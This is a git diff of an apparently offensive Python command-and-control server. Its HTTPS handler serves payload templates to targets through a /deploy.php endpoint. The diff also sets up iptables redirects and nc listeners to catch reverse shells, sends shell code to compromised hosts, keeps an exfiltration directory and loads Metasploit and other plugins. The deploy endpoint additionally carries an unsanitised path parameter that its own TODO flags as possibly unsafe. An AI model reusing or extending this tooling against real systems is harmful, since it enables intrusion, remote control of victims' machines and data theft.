@@ -33,65 +33,20 @@ from prompt_toolkit import prompt, PromptSession
 from prompt_toolkit.styles import Style
 from prompt_toolkit.patch_stdout import patch_stdout
 
+from tempfile import NamedTemporaryFile
+
 from colored import fg, bg, attr
 import shlex
 import pty
 
+import plugins
+from plugins import plugin
+from plugins.constants import *
 
-SETTINGS = {
-"exfil_dir":"/root/exfil/",
-"static_dir":"static/",
-"shell_dir":"shell/",
-"tmux_welcome":"tmux_welcome.sh",
-"LHOST":None,
-"LPORT":None,
-"RHOST":None,
-"target":None,
-"vars":["target", "LHOST", "LPORT", "RHOST"],
-"protocol":"https",
-"static_url":None,
-"session_count":0
-}
-
-# identifier:{message:"", default:""};
-force_prompt = {}
-
-managed_sessions = []
-
-targets = []
-
-target_info_all = {}
-
-tasks = {}
-
-#target = None
-
-#{
-#target:{
-#   "cmd":"cmd to fix iptables"
-#}
-#}
-FIN_WAIT = {}
-
-style = Style.from_dict({
-    # User input (default text).
-    '':          '#ff0066',
-
-    # Prompt.
-    'username': '#cc4444',
-    'at':       '#00aa00',
-    'colon':    '#aa0000',
-    'pound':    '#00aa00',
-    'hostname':     '#00ffff bg:#0011bb',
-    'ip':     '#0dd000 bg:#0011bb',
-    'path':     'ansicyan underline',
-})
+style = Style.from_dict(style_dict)
 
 tmux = libtmux.Server()
 sess = PromptSession()
-
-curr_prompt = None
-
 
 class TrashCollector(BaseHTTPRequestHandler):
 
@@ -109,22 +64,66 @@ class TrashCollector(BaseHTTPRequestHandler):
 """
 )
 
-    def do_GET(self):
+    def do_special_GET(self):
+        parsed = urlparse(self.path)
+        get_vars = {}
+        if parsed.query:
+            get_vars = urllib.parse.parse_qs(parsed.query)
+            tmp = {}
+            for k,v in get_vars.items():
+                if type(v) == list and len(v) == 1:
+                    tmp[k] = v[0]
+                else:
+                    tmp[k] = v
+            get_vars = tmp
+        
+        if parsed.path == '/deploy.php':
+            # TODO: Verify this is safe
+            filename = os.path.basename(get_vars['variant'])
+            rel_path = os.path.normpath("./{}/{}".format(get_vars['platform'], filename))
+            path = os.path.join(SETTINGS['deploy_dir'], rel_path)
+            print("Deploying {} on {}".format(path, self.get_host()))
+                        
+            t = NamedTemporaryFile(mode="w", delete=False)
+            try:
+                with open(path, "r") as f:
+                    s = f.read()
+                    s = apply_vars(s)
+                    print(s)
+                    t.write(s)
+                    t.flush()
+                    self.serve(t.name)
+            except Exception as e:
+                print(e)
+            finally:
+                os.remove(t.name)
+                self.serve(path)
+            return True
+
+
+    def serve(self, path):
         try:
-            rel_path = os.path.normpath("./{}".format(self.path))
-            path = os.path.join(SETTINGS['static_dir'], rel_path)
-
             logging.info("\tMapping request for {} to {}".format(self.path, path))
-
+            content_len = os.stat(path).st_size
             f = open(path, 'rb')
             self.send_response(200)
+            self.send_header('Content-Length', content_len)
             self.end_headers()
-            print("Serving {} to {}".format(rel_path, self.get_host()))
+            print("Serving {} to {}".format(self.path, self.get_host()))
             shutil.copyfileobj(f, self.wfile)
             f.close()
         except Exception as e:
             logging.info("{} Error serving Path: {}. {}".format(self.get_host(), path, e))
             self.do_404()
+        
+
+    def do_GET(self):
+        if self.do_special_GET():
+            return
+
+        rel_path = os.path.normpath("./{}".format(self.path))
+        path = os.path.join(SETTINGS['static_dir'], rel_path)
+        self.serve(path)
 
     def do_upload(self):
         # Do some browsers /really/ use multipart ? maybe Opera ?
@@ -258,7 +257,9 @@ class TrashCollector(BaseHTTPRequestHandler):
 
 def srv(ip, port):
     httpd = HTTPServer((ip, port), TrashCollector)
-
+    #context = ssl.create_default_context()
+    #context.load_cert_chain(keyfile="key.pem", certfile='cert.pem')
+    #httpd.socket = context.wrap_socket (httpd.socket, server_side=True)
     httpd.socket = ssl.wrap_socket (httpd.socket, 
             keyfile="key.pem", 
             certfile='cert.pem', server_side=True)
@@ -294,13 +295,15 @@ def show(k):
     else:
         print("{} not set".format(k))
 
-def read_attr(d, attr):
-    res = d.get(attr, None)
+def read_attr(d, attr, default='?'):
+    res = d.get(attr, default)
     if type(res) is list:
         if len(res) > 0:
             res = res[0]
         else:
-            res=None
+            res=default
+    if res is None:
+        res=default
     return res
         
 
@@ -313,7 +316,7 @@ def get_prompt(target_info):
             ('class:hostname',     read_attr(target_info, 'hostname')),
             ('class:ip',     "({})".format(read_attr(target_info, 'ip'))),
             ('class:colon',    ':'),
-            ('class:path',     read_attr(target_info, 'cwd')),
+            ('class:path',     read_attr(target_info, 'cwd') ),
             message[0]
         ]
     return message
@@ -384,9 +387,22 @@ def iptables_redirect(host):
     delfix_cmd = iptables.format(CMD="D", src=src, LPORT=SETTINGS["LPORT"], REAL_PORT=real_port, state=state)
     return {"add":add_cmd, "del":del_cmd, "fix":fix_cmd, "delfix":delfix_cmd, "port":real_port}
 
-
-def get_listener_cmd(port):
-    return "nc -nvlp {REAL_PORT};".format(REAL_PORT=port)
+# Moved to plugins/plugin.py so plugins can use it
+#def get_listener_cmd(target, port):
+#    cmd = FIN_WAIT.get(target, {}).get("handler", None)
+#    if cmd:
+#        cmd = plugin._replace_vars(cmd, {"REAL_PORT":port})
+#    else:
+#        cmd = SETTINGS["default_shell_handler"].format(REAL_PORT=port)
+#        if SETTINGS["default_shell_plugin"] == "True":
+#            prog = cmd.split(" ")[0]
+#            prog = compute_path(cmd.split(" ")[0], SETTINGS["plugins_dir"])
+#            if " " in cmd:
+#                cmd = "{} {}".format(prog , " ".join(cmd.split(" ")[1:]))
+#            else:
+#                cmd = prog + cmd
+#    print (cmd)
+#    return cmd
 
 # eventually: targets will be guaranteed unique, hosts (ip address) might not be
 def target_to_host(target):
@@ -400,7 +416,7 @@ def handle_shell(target, catch=False):
     #global tmux
     res = iptables_redirect(host)
 
-    listener = get_listener_cmd(res["port"])
+    listener = plugin.get_listener_cmd(target, res["port"])
     # Race conditions just make your code go faster, right?
     # DANGER: will not work correctly if using "catch"
     handler_cmd = res["add"] + listener
@@ -412,15 +428,23 @@ def handle_shell(target, catch=False):
     print("Handler: \n{0}\n{1}\n{0}\n".format("-"*(len(handler_cmd) + 3) , handler_cmd))
     new_session(get_session_name(host), window_cmd=handler_cmd)
     FIN_WAIT[target]["cmd"] = res["del"]+res["fix"]
-
+    # Custom handlers (like metasploit) are very slow to start
+    if "handler" in FIN_WAIT[target]:
+        print("Giving custom handler extra time to start...")
+        time.sleep(20)
+    else:
+        time.sleep(2)
     send_shell(target, FIN_WAIT[target]["shell"])
 
 
+def apply_vars(s):
+    for setting in SETTINGS["vars"]:
+        s = s.replace("{"+setting+"}", str(SETTINGS[setting]))
+    return s
 def get_shell(shell_file):
     with open(shell_file, 'r') as f:
         s = f.read()
-        for setting in SETTINGS["vars"]:
-            s = s.replace("{"+setting+"}", str(SETTINGS[setting]))
+        s = apply_vars(s)
         return s
 
 def send_shell(target, s):
@@ -447,7 +471,23 @@ def in_directory(file, directory):
 
 def options():
     for s in SETTINGS["vars"]:
-        print("{0: <10}:{1}".format(s, SETTINGS[s]))
+        print("{0: <10}:  {1}".format(s, SETTINGS[s]))
+
+# Low level helper that plugins can use
+def _shell(s, h=None):
+    t = SETTINGS.get("target", None)
+    if t:
+        if t in FIN_WAIT:
+            print("A shell handshake for {} is in progress -- wait until shell_FIN is received".format(t))
+        else:
+            task(t, "shell_SYN", None)
+            print("Waiting for shell_ACK...")
+            FIN_WAIT[t] = {"shell":s}
+            if h:
+                FIN_WAIT[t]["handler"] = apply_vars(h)
+    else:
+        print('Set a target - try "show targets"')
+
 
 def do(cmd):
     global managed_sessions
@@ -462,6 +502,24 @@ def do(cmd):
         if not cmd:
             return
         c = arr[0]
+        
+        # TODO: Anything but this
+        # Let plugins handle commands that they exported (via get_cmds())
+        plugin_func = None
+        for pc in SETTINGS['plugin_cmds']:
+            if c == pc[0]:
+                plugin_func = pc[1]
+                break
+        if plugin_func:
+            args = ""
+            if cmd.startswith(c):
+                args = cmd[len(c):].lstrip(" ")
+            res = plugin_func(cmd, args)
+            if res:
+                for cmd in res:
+                    do(cmd)
+            return
+
         if c == "set":
             set(arr[1], arr[2] if len(arr) > 2 else None)
         elif c == "show" or (c in globals() and not callable(globals()[c])):
@@ -520,30 +578,26 @@ def do(cmd):
                 if not is_url and not os.path.exists(path):
                     print("Error: {} does not exist - task not queued".format(path))
                 else:
-                    url = os.path.join(SETTINGS['static_url'], url_path)
+                    url = os.path.join(SETTINGS['STATIC_URL'], url_path)
                     print("File ready at {}".format(url))
             
             if SETTINGS["target"]:
-                task(SETTINGS["target"], c, url)
+                if len(arr) > 2:
+                    task(SETTINGS["target"], c, [url, arr[2]])
+                else:
+                    #task(SETTINGS["target"], c, url)
+                    # It's easier to handle on the client side if a filename is always provided
+                    task(SETTINGS["target"], c, [url, bn])
+                    
             elif not force_prompt:
                 print('Set a target - try "show targets"')
         elif c == 'shell':
-            if len(arr) > 1 and os.path.exists(compute_path(arr[1], dir=SETTINGS['shell_dir'])):
-                shell_file = compute_path(arr[1], dir=SETTINGS['shell_dir'])
+            if len(arr) > 1 and os.path.exists(plugin.compute_path(arr[1], dir=SETTINGS['shell_dir'])):
+                shell_file = plugin.compute_path(arr[1], dir=SETTINGS['shell_dir'])
                 print("Reading from {}".format(shell_file))
                 s = get_shell(shell_file)
                 print(s)
-                t = SETTINGS.get("target", None)
-                if t:
-                    if t in FIN_WAIT:
-                        print("A shell handshake for {} is in progress -- wait until shell_FIN is received".format(t))
-                    else:
-                        task(t, "shell_SYN", None)
-                        print("Waiting for shell_ACK...")
-                        FIN_WAIT[t] = {"shell":s}
-                    
-                else:
-                    print('Set a target - try "show targets"')
+                _shell(s)        
             else:
                 print("Possible shells:")
                 for root, dirs, file in os.walk(SETTINGS['shell_dir']):
@@ -551,9 +605,19 @@ def do(cmd):
                         p = os.path.join(root, f)
                         p = p[len(os.path.commonprefix([SETTINGS['shell_dir'], p])):]
                         print(p)
-            
+
+        # For use by plugins only
+        elif c == "_shell":
+            shell_cmd = arr[1]
+            handler_cmd = None
+            if len(arr) > 2:
+                handler_cmd = arr[2]
+            _shell(arr[1], handler_cmd) 
         elif c == 'catch':
             rhost = arr[1]
+            listener_cmd = ""
+            if len(arr) > 2:
+                listener_cmd = arr[2]
             handle_shell(rhost, catch=True)
         elif c == 'listen':
             rhost = first([SETTINGS["RHOST"], SETTINGS["target"], "0.0.0.0/0"])
@@ -716,15 +780,15 @@ def get_open_port():
     s.close()
     return port
 
-
-# if the user set an absolute path, use that, otherwise default to relative to install dir
-def compute_path(path, dir=None):
-    if dir is None:
-        dir = os.getcwd()
-
-    if not os.path.isabs(path):
-        path = os.path.join(dir, path)
-    return path
+# Moved to plugins/plugin.py so plugins can use it
+## if the user set an absolute path, use that, otherwise default to relative to install dir
+#def compute_path(path, dir=None):
+#    if dir is None:
+#        dir = os.getcwd()
+#
+#    if not os.path.isabs(path):
+#        path = os.path.join(dir, path)
+#    return path
 
 async def get_input():
     global curr_prompt
@@ -782,6 +846,26 @@ async def get_input():
         #    os._exit(1)
         dbg = dbg - 1
 
+
+########################
+#
+#      Plugins
+#
+########################
+# Modify this when adding new plugins
+def load_plugins():
+    global metasploit
+    global raidon
+    #global plugin
+    from plugins.metasploit import metasploit
+    from plugins.raidon import raidon
+    
+    # (func_name, function)
+    SETTINGS['plugin_cmds'].extend([(c,getattr(globals()['metasploit'], c)) for c in metasploit.get_cmds()])
+    print("Loaded {} from metasploit".format(metasploit.get_cmds()))
+
+    SETTINGS['plugin_cmds'].extend([(c,getattr(globals()['raidon'], c)) for c in raidon.get_cmds()])
+    print("Loaded {} from raidon".format(raidon.get_cmds()))
 if __name__=="__main__":
     global loop
 
@@ -791,23 +875,25 @@ if __name__=="__main__":
     srv_thread = threading.Thread(target=srv, args=(ip, port))
     srv_thread.daemon = True
 
-    SETTINGS['static_url'] = "{}://{}:{}/".format(SETTINGS['protocol'], ip, port)
+    SETTINGS['STATIC_URL'] = "{}://{}:{}/".format(SETTINGS['protocol'], ip, port)
     SETTINGS['LHOST'] = ip
     SETTINGS['LPORT'] = str(get_shell_port())
 
 
-    for d in ['static_dir', 'shell_dir', 'tmux_welcome']:
-        SETTINGS[d] = compute_path(SETTINGS[d])
+    for d in ['static_dir', 'shell_dir', 'plugins_dir', 'deploy_dir', 'payloads_dir', 'handlers_dir' ,'tmux_welcome']:
+        SETTINGS[d] = plugin.compute_path(SETTINGS[d])
 
     try:
         os.makedirs(static_dir)
     except Exception as e:
         pass
-    print("Static URL: {} serves {}".format(SETTINGS['static_url'], SETTINGS['static_dir']))
+    print("Static URL: {} serves {}".format(SETTINGS['STATIC_URL'], SETTINGS['static_dir']))
   
     new_session(get_session_name("127.0.0.1"), keys_script=SETTINGS['tmux_welcome'])
 
     purge_nat()
+
+    load_plugins()
 
     srv_thread.start()
     prompt_toolkit.eventloop.defaults.use_asyncio_event_loop() 
